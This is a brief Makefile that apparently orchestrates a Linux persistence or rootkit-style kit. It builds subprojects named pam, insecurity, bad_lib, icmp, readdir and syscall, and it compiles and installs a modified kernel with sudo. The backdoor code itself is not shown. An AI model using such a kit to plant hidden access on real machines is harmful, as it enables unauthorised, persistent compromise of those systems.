not_kernel: pam insecurity bad_lib lockdown # lockdown could be considered kernel since its an lmk but *shrug* (also lockdown is not yet persistant so will die on reboot)

all: not_kernel kernel

kernel: icmp readdir syscall
	sudo make -j `nproc` -C /build/linux-6.13.7/ && sudo make -C /build/linux-6.13.7/ install

icmp readdir syscall lockdown insecurity bad_lib: 
	$(MAKE) -C $@

pam: 
	sudo apt install -y libpam0g-dev libpam-modules libpam-runtime libpam-dev >/dev/null
	$(MAKE) -C pam

clean:
	echo "This system will never be clean again :("

.PHONY: pam insecurity icmp readdir syscall lockdown bad_lib